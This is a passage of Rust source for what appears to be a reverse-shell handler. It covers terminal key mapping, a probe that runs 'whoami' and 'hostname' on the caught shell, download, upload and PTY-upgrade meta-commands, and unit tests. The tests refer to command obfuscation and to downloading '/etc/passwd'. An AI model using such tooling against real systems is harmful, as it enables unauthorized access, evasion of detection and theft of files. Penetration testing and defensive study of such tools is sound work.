        KeyCode::F(10) => vec![0x1b, b'[', b'2', b'1', b'~'],
        KeyCode::F(11) => vec![0x1b, b'[', b'2', b'3', b'~'],
        KeyCode::F(12) => vec![0x1b, b'[', b'2', b'4', b'~'],
        _ => vec![],
    }
}

// ---------------------------------------------------------------------------
// Utilities
// ---------------------------------------------------------------------------

async fn probe_identity(
    reader: &mut tokio::net::tcp::OwnedReadHalf,
    writer: &mut tokio::net::tcp::OwnedWriteHalf,
) -> (String, String) {
    let probe = b"printf 'SHIDENTITY:%s:%s\\n' \"$(whoami)\" \"$(hostname -s)\"\n";
    if writer.write_all(probe).await.is_err() {
        return ("?".to_string(), "?".to_string());
    }
    let _ = writer.flush().await;

    let fut = async {
        let mut buf = vec![0u8; 4096];
        let mut acc = Vec::new();
        loop {
            let n = reader.read(&mut buf).await.unwrap_or(0);
            if n == 0 {
                break;
            }
            acc.extend_from_slice(&buf[..n]);
            let s = String::from_utf8_lossy(&acc);
            for line in s.lines() {
                if let Some(rest) = line.strip_prefix("SHIDENTITY:") {
                    let mut parts = rest.splitn(2, ':');
                    let user = parts.next().unwrap_or("?").trim().to_string();
                    let host = parts.next().unwrap_or("?").trim().to_string();
                    if !user.is_empty() && !host.is_empty() {
                        return (user, host);
                    }
                }
            }
        }
        ("?".to_string(), "?".to_string())
    };

    tokio::time::timeout(Duration::from_secs(2), fut)
        .await
        .unwrap_or_else(|_| ("?".to_string(), "?".to_string()))
}

fn generate_nonce() -> String {
    use rand::Rng;
    format!("{:08x}", rand::thread_rng().r#gen::<u32>())
}

fn last_line(s: &str) -> String {
    s.lines().last().unwrap_or("").to_string()
}

fn strip_done_marker(s: &str, nonce: Option<&str>) -> String {
    let Some(nonce) = nonce else {
        return s.to_string();
    };
    let marker = format!("SH_CMD_DONE_{}:", nonce);
    if let Some(pos) = s.find(&marker) {
        let after = s[pos..].find('\n').map_or(s.len(), |p| pos + p + 1);
        format!("{}{}", &s[..pos], &s[after..])
    } else {
        s.to_string()
    }
}

fn strip_start_marker(s: &str, nonce: Option<&str>) -> String {
    let Some(nonce) = nonce else {
        return s.to_string();
    };
    let marker = format!("SH_CMD_START_{nonce}");
    if let Some(pos) = s.find(&marker) {
        let after = s[pos..].find('\n').map_or(s.len(), |p| pos + p + 1);
        format!("{}{}", &s[..pos], &s[after..])
    } else {
        s.to_string()
    }
}

// ---------------------------------------------------------------------------
// Meta-commands
// ---------------------------------------------------------------------------

enum MetaAction {
    Help,
    Clear,
    Download { remote: String, local: String },
    Upload { local: String, remote: String },
    /// Switch to raw PTY passthrough (shell must already be PTY).
    Pty,
    /// Send PTY upgrade command then switch to raw passthrough.
    Upgrade,
}

fn parse_meta(cmd: &str) -> Option<MetaAction> {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    match parts.first().copied() {
        Some("help") => Some(MetaAction::Help),
        Some("clear" | "cls") => Some(MetaAction::Clear),
        Some("pty") => Some(MetaAction::Pty),
        Some("upgrade") => Some(MetaAction::Upgrade),
        Some("download") => {
            if parts.len() < 2 {
                return Some(MetaAction::Help);
            }
            let remote = parts[1].to_string();
            let local = parts
                .get(2)
                .map(|s| s.to_string())
                .unwrap_or_else(|| remote.rsplit('/').next().unwrap_or(&remote).to_string());
            Some(MetaAction::Download { remote, local })
        }
        Some("upload") => {
            if parts.len() < 3 {
                return Some(MetaAction::Help);
            }
            Some(MetaAction::Upload {
                local: parts[1].to_string(),
                remote: parts[2].to_string(),
            })
        }
        _ => None,
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use crate::cli::ObfuscationLevel;
    use crate::obfuscation::create_strategy;

    struct MockObfuscator;
    impl ObfuscationStrategy for MockObfuscator {
        fn obfuscate(&self, cmd: &str) -> String {
            format!("OBF({cmd})")
        }
    }

    #[tokio::test]
    async fn mock_obfuscator_works() {
        assert_eq!(MockObfuscator.obfuscate("ls"), "OBF(ls)");
    }

    #[tokio::test]
    async fn strategy_is_send_sync() {
        fn assert_send<T: Send>(_: &T) {}
        fn assert_sync<T: Sync>(_: &T) {}
        let e = create_strategy(ObfuscationLevel::Light, crate::cli::ShellType::Linux);
        assert_send(&e);
        assert_sync(&e);
    }

    #[test]
    fn nonce_is_8_hex_chars() {
        let n = generate_nonce();
        assert_eq!(n.len(), 8);
        assert!(n.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn last_line_extracts_prompt() {
        assert_eq!(last_line("out\nwww-data@box:~$ "), "www-data@box:~$ ");
        assert_eq!(last_line("$ "), "$ ");
        assert_eq!(last_line(""), "");
    }

    #[test]
    fn last_line_multiline_no_trailing_nl() {
        assert_eq!(last_line("a\nb\nroot@host:~# "), "root@host:~# ");
    }

    #[test]
    fn live_meta_record_cmd_increments() {
        let addr: std::net::SocketAddr = "127.0.0.1:9999".parse().unwrap();
        let mut m = LiveMeta::new(
            "__test_meta__",
            &addr,
            "root",
            "box",
            ObfuscationLevel::Heavy,
            ShellType::Linux,
        );
        assert_eq!(m.cmd_count, 0);
        m.record_cmd("ls");
        assert_eq!(m.cmd_count, 1);
        m.record_cmd("whoami");
        assert_eq!(m.cmd_count, 2);
        let _ = std::fs::remove_file(agent::info_path("__test_meta__"));
    }

    #[test]
    fn live_meta_strips_newlines() {
        let addr: std::net::SocketAddr = "127.0.0.1:9999".parse().unwrap();
        let mut m = LiveMeta::new(
            "__test_meta2__",
            &addr,
            "u",
            "h",
            ObfuscationLevel::Light,
            ShellType::Auto,
        );
        m.record_cmd("echo\nhello");
        assert!(!m.last_cmd.contains('\n'));
        let _ = std::fs::remove_file(agent::info_path("__test_meta2__"));
    }

    #[test]
    fn display_geometry_single_row() {
        let (rows, crow, ccol) = display_geometry("$ ", "abc", 1, 80);
        assert_eq!(rows, 1);
        assert_eq!(crow, 0);
        assert_eq!(ccol, 3); // 2 (prompt) + 1 (cursor after first char)
    }

    #[test]
    fn display_geometry_wraps() {
        // 5 chars in width-4: "hell" on row 0, "o" on row 1.
        let (rows, crow, ccol) = display_geometry("", "hello", 5, 4);
        assert_eq!(rows, 2);
        assert_eq!(crow, 1);
        assert_eq!(ccol, 1);
    }

    #[test]
    fn display_geometry_newline_in_buf() {
        let (rows, crow, ccol) = display_geometry("$ ", "a\nb", 3, 80);
        assert_eq!(rows, 2);
        assert_eq!(crow, 1);
        assert_eq!(ccol, 1);
    }

    #[test]
    fn display_geometry_cursor_at_start() {
        let (rows, crow, ccol) = display_geometry("$ ", "abc", 0, 80);
        assert_eq!(rows, 1);
        assert_eq!(crow, 0);
        assert_eq!(ccol, 2); // cursor right after prompt
    }

    #[test]
    fn strip_done_marker_removes_line() {
        let s = "output\nSH_CMD_DONE_abc:0\n";
        assert_eq!(strip_done_marker(s, Some("abc")), "output\n");
    }

    #[test]
    fn strip_done_marker_no_nonce_passthrough() {
        assert_eq!(strip_done_marker("output\n", None), "output\n");
    }

    #[test]
    fn strip_done_marker_no_match_passthrough() {
        assert_eq!(
            strip_done_marker("output\n", Some("xyz")),
            "output\n"
        );
    }

    #[test]
    fn raw_normalize_adds_cr() {
        assert_eq!(raw_normalize(b"a\nb"), b"a\r\nb");
    }

    #[test]
    fn raw_normalize_no_double_cr() {
        assert_eq!(raw_normalize(b"a\r\nb"), b"a\r\nb");
    }

    #[test]
    fn raw_normalize_strips_null() {
        assert_eq!(raw_normalize(b"a\x00b"), b"ab");
    }

    #[test]
    fn key_to_bytes_ctrl_a() {
        let key = KeyEvent {
            code: KeyCode::Char('a'),
            modifiers: KeyModifiers::CONTROL,
            kind: crossterm::event::KeyEventKind::Press,
            state: crossterm::event::KeyEventState::NONE,
        };
        assert_eq!(key_to_bytes(key), vec![0x01]);
    }

    #[test]
    fn key_to_bytes_arrow_up() {
        let key = KeyEvent {
            code: KeyCode::Up,
            modifiers: KeyModifiers::NONE,
            kind: crossterm::event::KeyEventKind::Press,
            state: crossterm::event::KeyEventState::NONE,
        };
        assert_eq!(key_to_bytes(key), vec![0x1b, b'[', b'A']);
    }

    #[test]
    fn key_to_bytes_f1() {
        let key = KeyEvent {
            code: KeyCode::F(1),
            modifiers: KeyModifiers::NONE,
            kind: crossterm::event::KeyEventKind::Press,
            state: crossterm::event::KeyEventState::NONE,
        };
        assert_eq!(key_to_bytes(key), vec![0x1b, b'O', b'P']);
    }

    #[test]
    fn parse_meta_pty_and_upgrade() {
        assert!(matches!(parse_meta("pty"), Some(MetaAction::Pty)));
        assert!(matches!(parse_meta("upgrade"), Some(MetaAction::Upgrade)));
    }

    #[test]
    fn parse_meta_basic() {
        assert!(matches!(parse_meta("help"), Some(MetaAction::Help)));
        assert!(matches!(parse_meta("clear"), Some(MetaAction::Clear)));
        assert!(matches!(parse_meta("cls"), Some(MetaAction::Clear)));
        assert!(matches!(
            parse_meta("download /etc/passwd"),
            Some(MetaAction::Download { .. })
        ));
        assert!(matches!(
            parse_meta("upload ./foo /tmp/bar"),
            Some(MetaAction::Upload { .. })
        ));
    }

    #[test]
    fn parse_meta_regular_returns_none() {
        assert!(parse_meta("ls -la").is_none());
        assert!(parse_meta("exit").is_none());
        assert!(parse_meta("whoami").is_none());
    }
}
